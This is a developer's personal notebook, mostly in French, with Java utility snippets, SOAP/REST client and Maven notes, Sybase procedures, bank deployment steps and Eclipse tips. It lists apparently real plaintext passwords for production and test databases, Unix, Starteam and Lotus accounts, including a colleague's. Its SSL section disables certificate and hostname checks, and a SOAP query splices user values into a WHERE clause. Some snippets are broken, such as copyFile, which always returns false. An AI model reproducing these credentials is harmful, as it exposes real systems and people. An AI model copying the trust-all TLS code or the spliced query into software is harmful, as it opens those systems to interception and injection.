		while (numberWithZeros.length()<lenght)                            
		{                                                                  
			numberWithZeros = "0".concat(numberWithZeros);                   
		}                                                                  
		return numberWithZeros;                                            
	}                                                                    
------------------------------------
	/**
	 * Get string representation for the current year and month YYYYMM
	 */
	public static String getYearMonth()  throws Exception {
		 StringBuffer yearmonth = new StringBuffer();
		 
		 //add 1 because months begin at 0 (0:jan, 1:feb...)
		 int month = Calendar.getInstance().get(Calendar.MONTH)+1;
		 // add a zero before month value 
		 // ex: for May instead of 5 we got 05 as month
		 String mois = (month < 10)? ("0" + month): ("" + month); 
		 
		 yearmonth.append(Calendar.getInstance().get(Calendar.YEAR));
		 yearmonth.append(mois);
		 
		 return yearmonth.toString();
	}
------------------------------
/**
	 * <strong>Sort a strings array in lexicographical order</strong>
	 */
	public static String [] sortElements(String [] files) {
		
		List<String> list = new ArrayList<String> (Arrays.asList(files));
		
		Collections.sort(list);
		
		Object [] objs = list.toArray();
		String [] result = new String [objs.length];
		int i=0;
		
		for (Object obj : list) {
			result [i++] = (String) obj;
		}
		
		return result;
		
	}
---------------------------
	/**
	 * Copy a file from srcPath to dstPath. 
	 * 
	 * @param srcPath
	 * @param dstPath
	 * 
	 * @return true if the copy is done.
	 * 
	 * @author SEI
	 * 
	 */
	public static boolean copyFile(String srcPath, String dstPath) throws Exception {
		boolean isDone = false;
		
        // Create channel on the source
        FileChannel srcChannel = new FileInputStream(srcPath).getChannel();
    
        // Create channel on the destination
        FileChannel dstChannel = new FileOutputStream(dstPath).getChannel(); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
    
        // Copy file contents from source to destination
        dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
    
        // Close the channels
        srcChannel.close();
        dstChannel.close();
	        
		return isDone;
	}
---------------------------
	/**
	 * Apply a pattern to a number value.   
	 * 
	 * 
	 * @param number
	 * @param pattern
	 * @return the number formatted 
	 * 
	 */
	public static String convertToPercentFormat(double number, String pattern) {
		DecimalFormat df = new DecimalFormat(pattern, new DecimalFormatSymbols(Locale.US));
		String numberFormatted = df.format(number);
		return numberFormatted;
	}
	
pour convertir un chiffre 1000000000 en 1 000 000 000 mettre des espaces: separateur de millier: 
      	public static String addSpacesForThousand(String string) {
      		String ret = "";
      		String string2 = "";
      		try
      		{
      				int i = string.indexOf(",");
      				if (i!=-1)
      					{
      					string2 = string.substring(0,string.indexOf(","));
      					}
      				else string2 = string;
      				Long a = Long.parseLong(string2);
      				 NumberFormat nf = NumberFormat.getInstance();
      				 				 NumberFormat nf = NumberFormat.getInstance(Locale.FRENCH); // c mieux de faire ca!!!!
      			        ret =  nf.format(a).toString();
      			        if (i!=-1) ret=ret.concat(",").concat((string.substring(i+1,string.length())));
      			   ret = ret.replace(' ', '\u00a0');
      		}
      		catch(Exception e)
      		{
      			ret=string;
      		}
      		return ret;
      	}

pour remplacer les points par des virgules dans un chiffre: 
          public static String replaceDotByCommaForNumbers(String data)
          	{
          		try
          		{
          			data= data.trim();
          			boolean isNumber = true;
          			String[] split = data.split("\\.");
          			StringBuffer newData = new StringBuffer();
          			for (int i = 0; i < split.length; i++) 
          			{
          				if (!isInteger(split[i])) {	
          				isNumber=false;
          				}
          				newData.append(split[i]);
          				if (i!=split.length-1)
          				{
          				newData.append(",");
          				}
          			}
          			if (isNumber)
          			{
          				data = newData.toString();
          			}
          		}
          		catch (Exception e)
          		{
          			logger.error(e,e);
          		}
          		return data;
          	}
---------------------------
	/**
	* recursively delete directories repertoire safely 
	* @param dir the directory to remove 
	*/
    private static boolean deleteDir(File dir) {
        File[] files = dir.listFiles();
        if (files != null) { // ou files.lenght >0?
            for (File file : files) {
                boolean deleted = file.delete(); // voir supprimer un fichier
                if (!deleted) {
                    // directory
                    if (file.isDirectory()) deleteDir(file);
                    // otherwise, there's nothing else we can do
                }
            }
        }
        return dir.delete(); // voir supprimer un fichier  
    }

Webservices : webservice : voir LINKSWAGGER voir exemple de webservice rest sans framework ici : d:\Profiles\lduverge\Desktop\Apprentissage\webservicedemo(attention pour l'entite j'ai pas respecte unclebob)
  dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.  
si erreur java.lang.AbstractMethodError: javax.ws.rs.core.UriBuilder.uri(Ljava/lang/String;)Ljavax/ws/rs/core/UriBuilder
      c parce que j'utilise pas les bonnes versions de librairies jersey/tomcat je crois. upgrader
  webservice renvoit une erreur policy? regarder au niveau "Autorisation"
tutoriel Pour faire des serveurs de webservice : http://www.tutorialspoint.com/restful/restful_first_application.htm (avec REST et Jersey : utilise annotation. Facile. )
        webservices: http://users.skynet.be/pascalbotte/
voir l'outil Soap Ui soapui bien pratique (dans installations)
SOAP utilise WSDL (le serveur donne au client un wsdl pour qu'il puisse appeller ses methodes) Pour voir les details d'un webservice avec wsdl : http://172.18.68.129:10512/hr-ws/services?wsdl (?wsdl à la fin)
REST client accède à un service à partir d'un URL et recoit en reponse json ou jpg ou plain text ou meme xml etc (meta-data dedans indique quoi) n'est pas forcement du http. Ca peut etre un websocket
UDDI est un annuaire des webservices sur internet
pour generer le wsdl a la main :
          se placer dans le repertoire classes et faire :
          "C:\Program Files\Java\jdk1.6.0_24\bin\wsgen" -verbose -keep -cp . com.test.TestSessionBeanBean -wsdl // ou com.test.TestSessionBeanBean  est une classe contenant anotation @WebService(et @Statefull si c un EJB aussi) et @WebMethod au niveau des meths
           cette classe doit implementer une interface qui est annotee de @WebService  et @WebMethod de la meme facon. 
          il va generer le wsdl et le xsd sous classes
pour generer java a partir de wsdl mais beurk : 
      "C:\Program Files\Java\jdk1.6.0_24\bin\wsimport" TestWebServiceBeanService.wsdl -verbose -keep -d repertoireOuGenererLeCodeSource
 pour generer java à partir de wsdl via maven : creer un projet maven avec le pom:
                                <?xml version="1.0" encoding="UTF-8"?>
                              <project xmlns="http://maven.apache.org/POM/4.0.0"
                                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                                       xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
                                  <modelVersion>4.0.0</modelVersion> // obligatoire 4.0.0 correspond à maven 3 ou 4 sais pas.. c utile si j'utilise une nouvelle version de maven
                              
                                  <groupId>com.soprahr.edsn.webservice.soap</groupId>
                                  <artifactId>cdcgide</artifactId>
                                  <version>1.0</version>
                              <build>
                              <plugins>
                                  <plugin>
                                      <groupId>org.jvnet.jaxb2.maven2</groupId> avant:	<groupId>com.sun.tools.xjc.maven2</groupId>  ou:<groupId>org.apache.cxf</groupId>
                                      <artifactId>maven-jaxb2-plugin</artifactId> avant: 	<artifactId>maven-jaxb-plugin</artifactId> ou <artifactId>cxf-codegen-plugin</artifactId>
                                      <version>0.13.1</version>
                                      <executions>
                                          <execution>
                                              <goals>
                                                  <goal>generate</goal>
                                              </goals>
                                          </execution>
                                      </executions>
                                  </plugin>
                              </plugins>
                              </build>
                              </project>
                 deposer dans resources mes .wsdl (et .xsd facultatif) et faire mvn package (ou bien mvn clean generate-sources?): ca cree un jar pour le webservice.     
         autre methode avec une autre librairie pour generer le java à partir du wsdl : voir la doc D:\Projets\CDC\Guide mise en oeuvre web service JAXWS-1.7.pdf au bon chapitre :Developpement d'un client web service conforme JAX-WS
                                  <plugin>
                                              <groupId>org.jvnet.jax-ws-commons</groupId>
                                              <artifactId>jaxws-maven-plugin</artifactId>
                                               <version>${jaxws.plugin.version}</version>
                                              <executions>
                                                  <execution>
                                                      <goals>
                                                          <goal>wsimport</goal>
                                                      </goals>
                                                  </execution>
                                              </executions>
                                              <configuration>
                                                   <bindingDirectory>${basedir}/src/main/resources/META-INF/wsdl</bindingDirectory>
                                                  <bindingFiles>
                                                       <bindingFile>xsd-binding.xml</bindingFile>
                                                       <bindingFile>wsdl-binding.xml</bindingFile>
                                                  </bindingFiles>
                                                   <sourceDestDir>${basedir}/src/main/java</sourceDestDir>
                                                   <wsdlDirectory>${basedir}/src/main/resources/META-INF/wsdl</wsdlDirectory>
                                                  <wsdlFiles>
                                                       <wsdlFile>Gide.wsdl</wsdlFile>
                                                  </wsdlFiles>
                                                  <wsdlLocation>/META-INF/wsdl/Gide.wsdl</wsdlLocation>
                                                  <xnocompile>true</xnocompile>
                                              </configuration>
                                              <dependencies>
                                                  <dependency>
                                                      <groupId>com.sun.xml.ws</groupId>
                                                      <artifactId>jaxws-tools</artifactId>
                                                      <version>2.2.5</version>
                                                  </dependency>
                                              </dependencies>
                                          </plugin>
                                           
pour appeller un webservice soap xml:     existe aussi Spring-WS
		URL urlWebService = new URL("http://su340ars.mc2.renault.fr:17051/ewf_wsv/services/GRMLoadNewRequest");
		GRMLoadNewRequestServiceLocator locator = new GRMLoadNewRequestServiceLocator();
			GRMLoadNewRequest proxy = locator.getGRMLoadNewRequest(urlWebService);... a terminer a faire
 autre methode pour appeller un webservice SOAP canal securise crypte :
 ou si j'ai l'erreur : unable to find valid certification path to requested target. Pour bypasser ignorer le trust handshake ssl :
            	String accesspoint = "https://ipam.intra.renault.fr/interfaces/ws.php";
             //String accesspoint = "https://s0218tts.mc2.Renault.fr/interfaces/ws.php";
             
             // Les lignes suivantes permettent d'ignorer un certificat SSL errone.(ou pas voir ci dessous)
              TrustManager[] tms = new TrustManager[0];
            try {
                            utilisable aussi là:LINK54636489
                SI je m'en fous de la securite:
                
                public class TrustAllHostNameVerifier implements HostnameVerifier {   //uniquement je crois pour HttpsURLConnection 
                    public boolean verify(String hostname, SSLSession session) {
                      return true;
                    }
                  }
                
                      tms = new TrustManager[]
                        {
                                new X509TrustManager()
                                {
                                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } // ou retur null;? 
                                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}  // ca c pour ignorer la securite trust.
                                }
                        };
                OU si je veux bien prendre en compte mon trustmanager et tester le handshake
                    String alg = TrustManagerFactory.getDefaultAlgorithm();
                    TrustManagerFactory tmFact = TrustManagerFactory.getInstance(alg);
                    FileInputStream fis = new FileInputStream("/hraccess9/AUCTSTBB/openhr/conf/kbane_ldap.jks");// vers un .jks et pas un .cer
                    java.security.KeyStore ks = java.security.KeyStore.getInstance("jks");
                    String password = "jkspass";      
                    ks.load(fis, password.toCharArray()); ou ks.load(fis, null); // a gauche le pwd sera obligatoire et à droite password pas necessaire facultatif si truststore) 
                    fis.close();
                    tmFact.init(ks);
                    TrustManager[] tms = tmFact.getTrustManagers();
                    //KeyStore
                    //KeyManager[] kms = getKeyManagers();
            PUIS
             SSLContext sc = SSLContext.getInstance("SSL"); ou "TLS"?
             sc.init(null, tms, new java.security.SecureRandom());
             // sc.init(kms, tms, null);
                sc.init(null, tms, null);

             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory()); // si c'est du http
             httpsConnection.setHostnameVerifier(new TrustAllHostNameVerifier ());  // si on veut ignorer un certificat SSL. (voir ci dessus la declaration de TrustAllHostNameVerifier)
             ou  LINK54636489
               // Facultatif: faire ça pour tester le handshake
                  SSLSocket socket = (SSLSocket) sc.getSocketFactory().createSocket(host, port); 
                  socket.setSoTimeout(10000);
                  socket.startHandshake();
                  socket.close();
              // FIN Facultatif: on peut faire ça pour tester le handshake
             ManagedSSLSocketFactory.setSocketFactory(sc.getSocketFactory() ); //si c'est du ldaps avec la classe ManagedSSLSocketFactory ci dessous  
             Thread.currentThread().setContextClassLoader(ManagedSSLSocketFactory.class.getClassLoader()); 
                                      public static abstract class ManagedSSLSocketFactory extends SSLSocketFactory ou SocketFactory les deux marchent mais SSLSocketFactory est moins verbeux. Moins secure? Sais pas. 
                                      {
                                         private static final ThreadLocal<SSLSocketFactory> local = new ThreadLocal<SSLSocketFactory>();
                                         ou 
                                         static ThreadLocal<SocketFactory> local = new ThreadLocal();
                                         
                                          public static void setSocketFactory(SSLSocketFactory factory) {local.set(factory);}
                                          ou 
                                          public static void set(SocketFactory factory) {local.set(factory);}
                                        
                                        public static SSLSocketFactory getDefault() {
                                        SSLSocketFactory result = local.get();
                                        ou
                                        SocketFactory result = (SocketFactory)local.get();
                                        if (result== null) {
                                            throw new IllegalStateException("No SSLSocketFactory parameters have been set!");
                                         }
                                         return result;
                                      }
                                    }
                                    
                                    
          pour tracer tls ssl debugger debuger je peux demarrer avec les options : -Djavax.net.debug=ssl:handshake:verbose
                                                      ou     -Djavax.net.debug=all
                                                            -Djava.security.debug=certpath
             // c'est aussi comme ça qu'on envoie une requette post (voir aussi plus loin) LINKrequ939302
                       URL url = new URL(urlgen + "ws/subscribe");
                          URLConnection  conn = (URLConnection) url.openConnection();
                          conn.setReadTimeout(10000);
                          conn.setConnectTimeout(15000);
                          conn.setDoInput(true);
                          conn.setDoOutput(true);
                          OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
                          wr.write( "user="+user);
                          wr.flush();
                          conn.getInputStream();
             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
             HttpsURLConnection.setDefaultHostnameVerifier(hv);
             CA NE MARCHE PAS SUR ANDROID :
             // Construction d'une connexion vers l'url
             HttpsURLConnection con = (HttpsURLConnection ) new URL(accesspoint).openConnection();
             con.setConnectTimeout(60*1000);
             con.setReadTimeout(60*1000);
             con.setDoOutput(true);
             con.setRequestMethod("POST");
             // Headers standard pour un appel SOAP.
             //con.setRequestProperty("Accept-Encoding", "gzip,deflate");
             con.setRequestProperty("Content-Type", "text/xml;charset=" + charset); // charset = UTF-8. facultatif
             con.setRequestProperty("SOAPAction", "urn:ip_subnet_list");
             // Authentification. Classique base64 de "login:password".
             //con.setRequestProperty("Authorization", "Basic cDA2NjYxODpwMXNzd29yZA==");
             //System.setProperty("jsse.enableSNIExtension", "false");
             // Ma requête SOAP, merci SOAP-UI et le WSDL.
             String reqXML = "";
             reqXML += "<soapenv:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:IPM_SOAP'>";
             reqXML += "<soapenv:Header/>";
             reqXML += "<soapenv:Body>";
             reqXML += "<urn:ip_subnet_list soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'>";
             reqXML += "<input xsi:type='urn:ip_subnet_list_in' xmlns:urn='urn:IPM'>";
             //reqXML += "<!--You may enter the following 7 items in any order-->";
             reqXML += "<auth_login xsi:type='xsd:string'>awcmdb0</auth_login>";
             reqXML += "<auth_password xsi:type='xsd:string'>42tzo7r</auth_password>";
             reqXML += "<WHERE xsi:type='xsd:string'>subnet_name like '"+subnetFilter+"' and subnet_class_parameters like '%rn_network_usage="+rnNetworkUsage+"%' and subnet_class_parameters like '%rn_site="+rnSite+"%'</WHERE>";
             reqXML += "<ORDERBY xsi:type='xsd:string'>subnet_name ASC</ORDERBY>";
             /* reqXML += "<!--Optional:-->";
             reqXML += "<OPT_SELECT xsi:type='xsd:string'>?</OPT_SELECT>";
             reqXML += "<!--Optional:-->";
             reqXML += "<WHERE xsi:type='xsd:string'>?</WHERE>";
             reqXML += "<!--Optional:-->";
             reqXML += "<ORDERBY xsi:type='xsd:string'>?</ORDERBY>";
             reqXML += "<!--Optional:-->";
             reqXML += "<limit xsi:type="xsd:string">?</limit>";
             reqXML += "<!--Optional:-->";
             reqXML += "<offset xsi:type='xsd:string'>?</offset>"*/;
             reqXML += " </input>";
             reqXML += "</urn:ip_subnet_list>";
             reqXML += "</soapenv:Body>";
             reqXML += "</soapenv:Envelope>";
             // On envoit la requête
             //log.error("getOutputStream ");
             OutputStream reqStream = con.getOutputStream();
             reqStream.write(reqXML.getBytes());
             // On recupere la reponse
             //log.error("getInputStream");
             InputStream reqResponse = con.getInputStream();
             // Ici le code HTTP de la reponse, normalement 200 si tout est OK
             int status = con.getResponseCode();
             //log.error("HTTP Status " +status);
             // On va recup l'ensemble de la reponse ligne par ligne et coller ça dans une variable texte
             String respXML = "";
             BufferedReader reader = null;
             try {
                 reader = new BufferedReader(new InputStreamReader(reqResponse, charset));
             	reader.readLine(); // ignore the first  <?xml version="1.0" encoding="UTF-8"?> line
                 for (String line; (line = reader.readLine()) != null;) {
             		respXML += line ;
             		//log.error("respXML = "+respXML);
                 }
             } finally {
                 if (reader != null) try { reader.close(); } catch (IOException logOrIgnore) {}
             }


pour utiliser jersey avec maven pour les webservices: 
          <dependency>
              	<groupId>com.sun.jersey</groupId>
              	<artifactId>jersey-server</artifactId>
              	<version>1.19</version>
              </dependency>
              <dependency>
              	<groupId>com.sun.jersey</groupId>
              	<artifactId>jersey-client</artifactId>
              	<version>1.19</version>
              </dependency>
              <dependency>
              	<groupId>org.apache.httpcomponents</groupId>
              	<artifactId>httpcore</artifactId>
              	<version>4.4-beta1</version>
              </dependency>
              <dependency>
              	<groupId>org.apache.httpcomponents</groupId>
              	<artifactId>httpclient</artifactId>
              	<version>4.4-beta1</version>
              </dependency>
              <dependency>
              	<groupId>org.json</groupId>
              	<artifactId>json</artifactId>
              	<version>20141113</version>
              </dependency> 

Compilation des proc (livrees sur starteam) en recette:
supprimer C:\projects\GISOdyssee-swd\recV7\build\recette\db\proc\erreur_compil_proc.txt
executer C:\projects\GISOdyssee-swd\recV7\build\recette\build.bat
(il va appeller un fichier ant qui va lui ouvrir le fichier de propriete 
C:\projects\GISOdyssee-swd\recV7\build\common\common-parameters.properties
pour pouvoir acceder à  Starteam et recuperer tous les .pro.
selectionner l'option 3 pour generer le script des pro concatenees.
ensuite executer 
ATTENTION!!! : visiblement SYBASE NE SUPPORTE PAS DES COMPILATIONS MASSIVES DE PROC, IL FAUT DONC LES COMPILER PAR BLOCS SINON IL VA MAL COMPILER ET ON Y VERRA QUE DU FEU SAUF QUE CA VA PLANTER A L'EXECUTION ET ON NE SAURA PAS POURQUOI.
C:\projects\GISOdyssee-swd\recV7\build\recette\db\proc\compile_proc.bat pour compliler (le regarder avant)

livraison de l'ear en recette:
supprimer C:\projects\GISOdyssee-swd\recV7\build\recette\db\proc\erreur_compil_proc.txt
tout recuperer sur start team et être bien à  jour et surtout TOUT LIVRER CAR IL RECUPERERA DE STARTEAM
supprimer C:\projects\GISOdyssee-swd\recV7\build\recette\ant-error.err
executer C:\projects\GISOdyssee-swd\recV7\build\recette\build.bat
selectionner l'option 1
verifier que C:\projects\GISOdyssee-swd\recV7\build\recette\ant-error.err est vide
Se connecter (transfert FTP) sur le serveur d'application UNIX correspondant avec avec winSCP avec mon compte u93522.mot de passe: 1235+(utiliser la carte)
	serveurs was:
	DEV: titss204
	REC: titss311
winscp marche avec pageant: http://winscp.net/eng/docs/ui_pageant
3) envoyer un mail 
Alain PICAS/BPSS/FR/EUROPE/GROUP@BNPPARIBAS, Pierre QUILBEUF/BPSS/FR/EUROPE/GROUP, PARIS BP2S GIS IT GISODYSSEE
Debut Deploiement Recette

Un deploiement en recette commence dans 2 minutes. 
Merci de vous deconnecter et d'attendre mon feu vert pour toute reconnexion.
Laurent

------------------------------
*****procedures stockees Sybase :************
execution d'une procedure stockee :
	declare 	
	@error_code int  ,
 	@id_msg     varchar(200)  , // ici ca veut dire qu'il met 200 bytes (pas 200 caracteres) si on veut 200 caracters il faut mettre VARCHAR(200 char) sous reserve que le paramètre de base NLS_LENGTH_SEMANTICS soit positionne à  sa valeur defaut : BYTE).
	@msg_param  varchar(200)  
	exec PS_CALENDARCLPLX_LIST @error_code Output,@id_msg Output,@msg_param  Output,'%','%','%'

declare  selectCalendCplx cursor for
	select 	ID_CCX, LIBELLE, CODE, STATUS, COMPOSITION from #tmp_calendcplx
open selectCalendCplx
fetch selectCalendCplx into @id, @lib, @code, @status, @composition
while (@@sqlstatus = 0)
begin

	select @nm_calend = ''
	
.....




fetch selectCalendCplx into @id, @lib, @code, @status, @composition
end
close    selectCalendCplx
deallocate cursor selectCalendCplx		



Log de recette et de prod:
http://viewfiles-bp2s.ams.echonet/
goe_web
gisodyssee
liste du haut pour la recette: TITSS303 ou TITSS311: regarder dans code source en tete pour le savoir
-> regarder system.out.. ou autre.


*****FIN procedures stockees Sybase:************
RECETTE: connexion à  gisOdysee avec compte d'abdo:
user 294470
mdp 294470 OU MDP: Bach81
moi:
user 340795
pass: it_123

sybase: 
descriptif d'une table: sp_help NOMTABLE
sp_helptext NOM DE LA  STOCKEE

BNP:
AMS-ASSET MANAGEMENT AND SERVICES
AFFECTATION/ BP2S - TECHNOLOGIE FRANCE 07220
ACI: CTA02A1
MAIL: laurent.duverge@bnpparibas.com
pass lotus: laurentduverge
UID: 340795 ASSISTANT EXTERIEUR
Identifiant annuaire: 340795
Code analytique:l PFS: 07220
code unix: u93522 mot de passe: 1235 (utiliser la carte)
base de donnee dev: TIT10_PAR_DEV_SQL
user: titris
pass: titris
base de donnee test: TIT1_PAR_TST_SQL
user: sil_titris
pass: sil_titris
base de donnee prod:FR43_PAR_LIV_SQL
user: d_gisodyssee
pass: DBO_titr1s

Starteam:
user:340795
password: Laurentduverge8589 (avec L majuscule!)

Menus en base: SWD_MENU_ITEM.MENU_ITEM_LB SWD_MENU_ITEM.PAGE_ID -> SWD_PAGE.PAGE_URL
select PAGE_URL from SWD_PAGE where PAGE_ID IN (select PAGE_ID from SWD_MENU_ITEM where MENU_ITEM_LB like "Dashboard")


lecteur distant de Thibaut:
\\parw00054118\gisodyssee-swd

DEVOPS : 
 voir Linktestdevopsç9349 et LINKDevopslksjqgfvmlka
 pas de specialistes, que des généralistes : rotation.
 reduire le nombre de "handof"(je passe le relai a qq d'autre)
 Automatiser -creation des environnements(doivent être = le + possible:loadbalancer etc...) ,execution(le processus de depl doit ê le meme pot les envs) tests(Run tests auto à chaque commit (et non pas periodiquement) (les tests doivent s'executer en //(process != pour plus de rapidite sinon 30 min c trop long. il faut moins de 20min pour les tests) + smoketest(=connectivité avc ext [=selenium]), deploiements: un seule team (5-10pers max (tous doivent etre cap de builder->livrer dans les !=envs: devs et ops)) le fait pour reduire les dependances
 possible rollback en 1 click sur 1 bouton
 historisation des deploys: qui? quand? VersQuelEnv? pourQuelResultat? diffAvant-Apres? : a chaque deploy tous recoivent cet historique par email ou chat
 pas de branches: trunk based developpement : tous dans le trunck des que les tests automatises signalent une erreur, tout le monde s'arrete et on corrige l'erreur.->vert. Chaque commit peut tout casser. C normal voir LINKgatedcommit. Reception alerte automatique ->on repare tout de suite.
 LINKgatedcommit : gated commit : lors du commit, avant le system regarde si merge et build ok. Si ko le commit ne se fait pas->alerte au developpeur 
 On ne répare plus un environnement, on le remplace: creation d'un env est très rapide et automatique. Interdit de modif en prod. passer par version control et tout recreer from scrach
 reduire le nombre de "handof"(je passe le relai a qq d'autre)
 usecase->dev->test->opProd: livrer 100x/jour des touts petits lots(a chaque dev terminé)(incite la com) businessvaluevisiblespour client. Livrer de A à Z(prod) avant de faire autre chose.
      businessvaluevisiblespour client pas necessaires à livrer au debut si on est en train from scrach de de créer l'application et son architecture 
 LINKusecase usecase =
      given that un etat 
      with un autre etat
      then retour attendu 
      exemple: 
        SPRINT1 : manage a tennis GAME within a set of a tennis match
          User Story 1 :
          As a tennis referee
          With  simple Game rules
          Then display to me the current Game score of each player
                    Rules details:
                   The game starts with a score of 0 point for each player
                   Each time a player win a point, the Game score changes as follow:
                    0 -> 15 -> 30 -> 40-> Win game
 Run tests auto à chaque commit (et non pas periodiquement)
 les environnements aussi doivent être dans versionControlGit-svn. Sont versionnés.
 Si pb detecté pendant livraison: feedback(a chaque livr) info a transmettre à tous.(pas blamer mais informer)
 Chaque jour meeting(avec les devs+ops): ce que j'ai fait hier, ce que je fais aujourd'hui, ce qui m'empêche d'avancer
 meeting fin d'un cycle de dev : ce qui a fonctionné, ce qui peut etre amélioré
  Tout le monde (Dev et Ops) utilisent le meme mantis
  chat avec historique et possible à plusieurs. 
 2 façon de releaser en prod: (deployement!=release) 
  ENVIRONMENT-BASED-releasepattern : (loadbalancer est cap de diriger un % qualifié de users sur l'un ou l'autre des serveurs). Ajouter à ça clusterImmuneSystem cap detecter problemes(perfs, nbvisite chutte...) apres livraison en PROD
  a) blue-green pattern
          DBBlue ServAppl servWebBlue____
                                         \_loadbalancer ne dirige que sur serveur Blue les clients. et sur serveurGreen l'équipeDev. tous les deployement se font d'abord sur serveur Green puis quand on a bien testé: on met en readonly DBBlue, Backup DBBlue, Copie data DBBlue vers DBGreen, release!: bascule le trafic sur serveur Green et dorénevent les push se font sur serveurBlue. 
          DBGreen ServApp2 servWebGreen                                                                                                                                                                                                                                                                                                                                               
  b) decoupledDatabase : a utiliser de preference si + de 2 versions derriere le loadbalancer car ça devient compliqué de gerer les versions de DB.
                    ServAppl servWebBlue____
           1seuleDB/                        \_loadbalancer ne dirige que sur serveur Blue les clients. et sur serveurGreen l'équipeDev. tous les deployement se font d'abord sur serveur Green puis quand on a bien testé. Bascule sur ServeurGreen. On a developpe pour que DB soit la meme car on fait extensions et non pas modifs de la DB. bascule le trafic sur serveur Green et dorénevent les push se font sur serveurBlue.
                   \ServApp2 servWebGreen                                                                                                                                                                                                                                                                                                                                               
                
        
  APPLICATION-BASED-releasepattern : (=darklaunching) 
            chaque evol est accessible en prod qu'à un nombre limité de personnes (besoin modif code applicatif pour ça. 1% des clients + Tous les devs + 50% des admins par ex) et au fur et à mesure des tests on ouvres les fonctionnalités à tout le monde via modif de conf prise en compte à chaud. Rollback facile.
            implique que en horsprods toutes les nouvelles fonctionnalites soient à ON pour tous. pour etre sur que qui peut le plus peut le moins
  RUN:
    monitor envPRODouRECouEtc... doit etre très dispo. Plus que l'env lui meme.
    Centraliser les logs et metrics de tous(DB,app,builds,deploiementMVN....) au meme endroit. Logs rotation auto, deletion auto. voir linux syslog -> donnees statistiques/logs + durees exec ->(StatsD+Graphite accessible a tous)->conf alertes->notifications auto(mail+(jenkins+catlight))
          si Docker ne pas loguer dans des fichiers mais dans stderr et stdout et laisser docker gerer (???)
    logs : sur: authent et logout, accessdata, updates des droits, modifs niveau crud, invalid input, ram et cpu dispo, service repond? erreurs, delais,SAVok ou ko, valeurs business(nbventes...) durees transactions requettes
    alertes : alerts : alert : qd existe ko quels logs avant? les rajouter dans les alertes.


jenkins :
  jenkins home directory contient: // parametrable dans l'admin web. Existe commandes CLI plus rapidesque ihm  
        /etc/...
        /.jenkins/config
        ...
   un ou plusieurs jobs tournent sur un node. Le choix du node se fait grace a regexp sur label dans la config du job.
          masterNode
          /         \
    node1           node2 // peut etre sur une machine distante
    
    quietPeriod : laisser une valeur >=5 sec
    pollSCM : c a d executer le run quand qqun commit           
visual studio :pour javascript:
    zoom et dezoom: ctrl+"+" ou "-" du pavé numérique
    accolade correspondante: ctrl+shift+*
eclipse :
import/export run configuration possible
    menu file>import/export> run/debug ...
show in package explorer :  
        Alt+shift+w
si j'ai eclipse edit source lookup path source not found lors du debuggage:
  peut etre ajouter -DdownloadSources=true après commande maven
  puis
  package>clique droit sur la librairie maven manquante >Maven>download sources. Ensuite Debug... >onglet sources> add source > external archive > ajouter la librairie xxx.source dans le buidpath (peut etre besoin redemarrer eclipse mais redemarrer le debugger) IL FAUT REDEMARRER LE DEBUGGAGE POUR QUIL PRENNE EN COMPTE
      
comparer les fichiers un a un:
    dans packageExplorer selectionner les deux fichiers > click droit > compare > with eachother
si il ne cree pas les classes:
  closeproject, openproject, clean, refresh, regarder view problems
creer workspace avec projets existants:
    file>switchtoworkspace>other>ecire nouveau nom. Copier projets dans le workspace avec explorer>eclipse import ProjectIntoWorkspace et importer tous ces projets.
    sinon si c pas un projet mais le code source: import>java project...
prend trop de temps pour valider les fichiers xml 
    prop>General>Validation>Decocher validations xml buid et manuel
Tout reduire plier : Ctrl+shift+/(pave numerique) tout déplier Ctrl+shift+*
si une view pannel ne s'affiche plus : 
    windows->reset perspective
Setter le working directory workingdirectory: 
      sous eclipse dans RUN>workingpath on peut definir le chemin d'execution du programme. pour le setter en ligne de commande 
          utiliser "-Duser.dir=..."
si auto inplementation ctrl space ctrl espace controle espace ne marche plus :
    preferences>java>editor>contentAssit>advenced  
si j'ai ce message : Referenced classpath provider does not exist: org.eclipse.m2e.launchconfig.classpathProvider
      installer/reinstaller le plugin maven et ca marche
si le repository maven n'a pas l'air de se raffraichir recharger jar
    supprimer dans le repository local le fichier correspondant lastUpdated puis   
    windows> preferences> maven> update settings, Reindex, Apply, OK
defiler sans bouger curseur: 
    Ctrl + fleches haut ou bas
pour ajouter une librairie dll :car erreur native manquant: ou dependency blabla
  ajouter les .dll sous mon C:\Program Files\Java\jdk1.7.0\jre\bin\là.
  si c'etait sur unix on met libjivonatts_native.so là: 
  /usr/lib
  j'ai essaye ca ci-dessous mais ca n'a pas marche:    
  dans run>vm arguments ajouter :(mettre le chemin complet)
      -Djava.library.path=file:C:\wamp\www\kanail\AudioLoopOnline\java\sivox\donnees\IvonaNative\i686-pc-win32\jivonatts_native.dll
   
Pour specifier ou est la javadoc :
    projet > properties > javadoc > javadoclocation
Si il prend trois heures pour builder un projet à cause des facets: (infini) invoking faceted project validation builder
    fermer eclipse (forcer) > renommer le repertoire du projet qui merde > relancer eclipse > le projet est ferme. > renomer normalement le repertoire du projet > ouvrir le projet
      
raccourcis shortcuts utiles: (pour les definir : WIndows>Preference>chercher "shorcut")
    rechercher partout: alt puis a puis f
    voir les todos : ctrl+shift+q; q > task > tasklist
    fold all plier tout Ctrl+Shift+ / du numpad 
    unfold all plier tout Ctrl+Shift+ * du numpad ou Ctrl + / du numpad                                               
    Ctrl + shift + fleche haut ou fleche bas: passer d'une methode a l'autre de la classe
      debug : 
          F5: entrer
          F6 : un pas
          F7 : sortir
          F8: continuer
      Atteindre la methode : F3
